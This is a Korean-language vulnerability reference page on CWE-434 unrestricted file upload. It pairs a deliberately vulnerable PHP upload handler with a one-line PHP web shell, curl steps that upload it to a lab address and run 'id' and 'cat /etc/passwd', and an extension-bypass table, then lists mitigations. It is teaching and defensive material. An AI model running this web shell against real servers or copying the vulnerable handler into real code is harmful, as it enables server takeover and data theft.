# CWE-434: Unrestricted File Upload

파일 업로드 시 확장자·MIME·내용 검증 없이 서버에 저장하여 공격자가 웹셸(.php)을 업로드하고 원격 코드를 실행할 수 있는 취약점입니다.

## 목차

| 섹션                                                                                                 |
|------------------------------------------------------------------------------------------------------|
| [1. 개요](#1-개요) / [2. 원리](#2-원리) / [3. PoC](#3-poc) / [4. 영향](#4-영향) / [5. 대응](#5-대응) |

---

## 1. 개요

| 항목      | 내용                                                      |
|-----------|-----------------------------------------------------------|
| CWE ID    | CWE-434                                                   |
| 이름      | Unrestricted Upload of File with Dangerous Type           |
| OWASP     | A06:2025 Insecure Design                                  |
| 영향      | RCE (웹셸 설치 → 서버 장악)                               |
| 빈도      | 높음 — 게시판, 프로필 사진, 문서 업로드 기능에서 발생     |
| 전제 조건 | 업로드 검증 없음 + 업로드 디렉토리에서 스크립트 실행 가능 |

[⬆ 목차로 돌아가기](#목차)

---

## 2. 원리

### 취약 코드 (PHP)

```php
<?php
// 파일 유형 검증 없이 그대로 저장 — 취약
$target = '/var/www/html/uploads/' . basename($_FILES['file']['name']);
move_uploaded_file($_FILES['file']['tmp_name'], $target);
chmod($target, 0777);
echo "Upload: <a href='/uploads/" . basename($_FILES['file']['name']) . "'>link</a>";
?>
```

### 발생 조건

| 조건                      | 설명                                       |
|---------------------------|--------------------------------------------|
| 확장자 검증 없음          | .php, .phtml, .phar 등 실행 가능 파일 허용 |
| MIME 타입 미확인          | Content-Type 헤더를 신뢰하거나 검증 안 함  |
| 파일 내용 미검증          | 매직바이트(file signature) 확인 안 함      |
| 업로드 디렉토리 실행 가능 | Apache가 uploads/ 에서 PHP를 해석함        |
| 권한 과다                 | 777, owner root → 누구나 쓰기 가능         |

### 공격 흐름

```
1. 공격자: backdoor.php 파일 생성
   <?php echo shell_exec($_GET['cmd']); ?>

2. 업로드 폼에서 backdoor.php 제출

3. 서버: /var/www/html/uploads/backdoor.php 로 저장

4. 공격자: http://target/uploads/backdoor.php?cmd=id 접속
   → 웹 서버 권한으로 명령 실행
```

[⬆ 목차로 돌아가기](#목차)

---

## 3. PoC

### 실습 URL

```
http://192.0.2.182/file_upload.php
```

### 테스트 단계

1. 로컬에 웹셸 파일 생성:

```bash
echo '<?php echo shell_exec($_GET["cmd"]); ?>' > /tmp/backdoor.php
```

2. 업로드:

```bash
curl -F "file=@/tmp/backdoor.php" http://192.0.2.182/file_upload.php
```

3. 실행 확인:

```bash
curl "http://192.0.2.182/uploads/backdoor.php?cmd=id"
# 예상: uid=48(apache) gid=48(apache)

curl "http://192.0.2.182/uploads/backdoor.php?cmd=cat+/etc/passwd"
# 예상: root:x:0:0:root:/root:/bin/bash ...
```

### 확장자 우회 테스트

| 파일명          | 실행 여부 | 설명                           |
|-----------------|-----------|--------------------------------|
| `shell.php`     | ✅        | 기본 PHP 확장자                |
| `shell.phtml`   | ✅        | Apache 기본 PHP 핸들러         |
| `shell.php5`    | ✅        | PHP 5 호환 핸들러              |
| `shell.phar`    | ✅        | PHP 아카이브                   |
| `shell.php.jpg` | ❌        | 더블 확장자 (설정에 따라 다름) |
| `shell.jpg.php` | ✅        | 마지막 확장자 기준 실행        |

> `.phtml` 실행 여부는 배포판 PHP 핸들러 설정에 따라 다릅니다. Ubuntu 기본 설정은 `.php`·`.phtml`·`.phar`, RHEL 계열(CentOS Stream 9) 기본 `php.conf`는 `.php`·`.phar`만 PHP로 처리합니다.

[⬆ 목차로 돌아가기](#목차)

---

## 4. 영향

| 영향            | 설명                                |
|-----------------|-------------------------------------|
| 웹셸 설치       | 지속적 원격 접근 (삭제 전까지 유효) |
| 서버 장악       | 리버스 셸 → 내부 침투               |
| 데이터 탈취     | DB 접속 정보 → 데이터 유출          |
| 악성코드 호스팅 | 업로드 경로를 악성코드 배포에 활용  |
| 디페이스        | 웹 페이지 변조                      |

[⬆ 목차로 돌아가기](#목차)

---

## 5. 대응

### 확장자 화이트리스트

```php
<?php
$allowed_ext = ['jpg', 'jpeg', 'png', 'gif', 'pdf'];
$ext = strtolower(pathinfo($_FILES['file']['name'], PATHINFO_EXTENSION));
if (!in_array($ext, $allowed_ext)) {
    die("허용되지 않은 파일 형식");
}
?>
```

### MIME 타입 + 매직바이트 검증

```php
<?php
$finfo = finfo_open(FILEINFO_MIME_TYPE);
$mime = finfo_file($finfo, $_FILES['file']['tmp_name']);
$allowed_mime = ['image/jpeg', 'image/png', 'image/gif', 'application/pdf'];
if (!in_array($mime, $allowed_mime)) {
    die("허용되지 않은 MIME 타입: $mime");
}
?>
```

### 업로드 디렉토리 PHP 실행 금지 (httpd.conf)

```apache
<Directory "/var/www/html/uploads">
    php_admin_flag engine off
    Options -ExecCGI
    RemoveHandler .php .phtml .phps .phar
    AddType application/octet-stream .php .phtml .phar
</Directory>
```

> `php_admin_flag`는 mod_php 전용 지시어라 PHP-FPM(`proxy_fcgi`) 환경에서는 httpd 설정 검사에서 오류가 납니다. 배포판 기본 설정은 `<FilesMatch>` 안의 `SetHandler`로 PHP를 연결하므로, 확장자 기준인 `RemoveHandler`·`AddType`으로는 실행이 막히지 않습니다. 적용 후 업로드 경로의 PHP 파일 요청이 실행되지 않는지 확인하고, 아래 저장 분리를 우선 검토합니다.

### 파일명 랜덤화

```php
<?php
// 원본 파일명 사용 금지 → UUID + 허용 확장자
$new_name = bin2hex(random_bytes(16)) . '.' . $ext;
$target = $upload_dir . $new_name;
?>
```

### 저장 분리

| 방법                   | 설명                                    |
|------------------------|-----------------------------------------|
| DocumentRoot 외부 저장 | `/var/uploads/` (웹에서 직접 접근 불가) |
| S3 등 외부 스토리지    | 서버 파일 시스템에 저장하지 않음        |
| 별도 다운로드 스크립트 | `download.php?id=123` → readfile()      |

[⬆ 목차로 돌아가기](#목차)

---

## 참고 자료

- CWE-434: [cwe.mitre.org/data/definitions/434.html](https://cwe.mitre.org/data/definitions/434.html) — ★★★☆☆
- OWASP File Upload: [owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload) — ★★★☆☆
- OWASP Top 10:2025 A06 Insecure Design(CWE-434 매핑): [top10.owasp.org/2025/A06_2025-Insecure_Design](https://top10.owasp.org/2025/A06_2025-Insecure_Design/) — ★★★☆☆
- CentOS Stream 9 `php.conf`(`.php`·`.phar`만 `SetHandler`): [gitlab.com/redhat/centos-stream](https://gitlab.com/redhat/centos-stream/rpms/php/-/blob/c9s/php.conf) — ★★★☆☆
- Apache mod_mime(`RemoveHandler`는 확장자 연결만 해제, core의 `SetHandler`가 우선): [httpd.apache.org](https://httpd.apache.org/docs/2.4/mod/mod_mime.html) — ★★★☆☆
- PHP 설정 변경(`php_admin_flag`는 Apache 모듈 방식 전용): [php.net](https://www.php.net/manual/en/configuration.changes.php) — ★★★☆☆

---

## 통계

![GitHub stars](https://img.shields.io/github/stars/siasia86/system-engineering-resources?style=social)
![GitHub forks](https://img.shields.io/github/forks/siasia86/system-engineering-resources?style=social)
![GitHub watchers](https://img.shields.io/github/watchers/siasia86/system-engineering-resources?style=social)
![GitHub last commit](https://img.shields.io/github/last-commit/siasia86/system-engineering-resources)
![License](https://img.shields.io/github/license/siasia86/system-engineering-resources)
![Actions](https://img.shields.io/github/actions/workflow/status/siasia86/system-engineering-resources/update-date.yml)

---

**작성일**: 2026-07-02

**마지막 업데이트**: 2026-11-09

© 2026 siasia86. Licensed under CC BY 4.0.
